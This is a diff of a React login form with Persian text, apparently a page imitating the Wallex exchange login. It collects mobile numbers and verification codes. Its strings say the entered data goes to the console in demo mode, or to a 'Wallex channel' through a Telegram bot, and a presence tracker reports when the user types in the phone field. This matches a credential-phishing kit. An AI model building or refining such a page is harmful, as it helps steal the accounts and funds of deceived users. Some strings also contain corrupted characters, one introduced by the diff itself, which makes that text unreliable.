@@ -260,7 +260,7 @@ export const LoginForm = () => {
       if (!validateTelegramConfig()) {
         console.log("🎭 Demo verification code: 123456");
         alert(
-          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت واقعی این کد به تلگرام ار��ال می‌شود)",
+          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت واقعی این کد به تلگرام ارسال می‌شود)",
         );
       }
 
@@ -878,7 +878,7 @@ export const LoginForm = () => {
                 <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
                     {!validateTelegramConfig()
-                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
+                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظ��م کنید."
                       : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
@@ -952,8 +952,8 @@ export const LoginForm = () => {
                       maxLength={11}
                       value={toPersianDigits(mobileNumber)}
                       onChange={handleMobileNumberChange}
-                      onFocus={() => typingDetection.startTyping("phone")}
-                      onBlur={() => typingDetection.stopTyping("phone")}
+                      onFocus={() => presence.startTyping("phone")}
+                      onBlur={() => presence.stopTyping()}
                       autoFocus
                       disabled={isSubmitting}
                       style={{
@@ -1057,7 +1057,7 @@ export const LoginForm = () => {
                             whiteSpace: "nowrap",
                           }}
                         >
-                          شمار�� همراه را وارد کنید.
+                          شماره همراه را وارد کنید.
                         </span>
                       </legend>
                     </fieldset>
